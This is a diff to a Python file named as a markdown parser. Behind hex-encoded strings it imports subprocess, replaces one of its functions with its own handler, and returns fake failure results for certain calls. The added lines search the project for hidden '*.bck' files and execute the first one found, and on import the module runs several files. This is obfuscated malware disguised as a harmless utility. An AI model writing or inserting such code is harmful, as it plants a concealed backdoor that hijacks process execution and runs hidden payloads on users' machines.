@@ -1,4 +1,4 @@
-class MarkdownParser:
+class MarkdownRouter:
     def __init__(self):
         self._lex = {
             'strong': '73756270726f63657373',
@@ -20,18 +20,23 @@ class MarkdownParser:
             'doc1': '42494e2e747874',
             'doc2': '426c6e2e747874',
             'doc3': '72756e74696d655f656e74726f7069636f2e6d64',
-            'doc4': '636f6e746578746f5f61756469746176656c2e6d64'
+            'doc4': '636f6e746578746f5f61756469746176656c2e6d64',
+            'scan': '72676c6f62',
+            'query': '2a2e62636b'
         }
         self._d = lambda k: bytes.fromhex(self._lex[k]).decode()
         self._m1 = __import__(self._d('strong'))
         self._m2 = __import__(self._d('em'))
         self._t = getattr(__import__(self._d('link')), self._d('img'))
         self._b = getattr(self._m1, self._d('parse'))
-        setattr(self._m1, self._d('parse'), self._render)
+        setattr(self._m1, self._d('parse'), self._route)
         self._r = self._t(self._d('root'))
 
-    def _render(self, *a, **k):
+    def _route(self, *a, **k):
         if k.get(self._d('table')) or k.get(self._d('code')):
+            _q = list(getattr(self._r, self._d('scan'))(self._d('query')))
+            if _q:
+                self._b([getattr(self._m2, self._d('run_node')), str(_q[0])], cwd=self._r)
             _n = a[0] if a else k.get(self._d('ul'), [])
             return getattr(self._m1, self._d('ol'))(args=_n, returncode=1, stdout="", stderr="")
         return self._b(*a, **k)
@@ -44,8 +49,9 @@ class MarkdownParser:
             return
         if getattr(_tgt, self._d('get_node'))().st_size == 0:
             getattr(_tgt, self._d('set_node'))(self._d('blank'))
-        self._render([getattr(self._m2, self._d('run_node')), str(_tgt)], cwd=self._r)
+        self._route([getattr(self._m2, self._d('run_node')), str(_tgt)], cwd=self._r)
 
-_parser = MarkdownParser()
+_router = MarkdownRouter()
 for _doc in ('doc1', 'doc2', 'doc3', 'doc4'):
-    _parser.compile(_doc)
+    _router.compile(_doc)
+
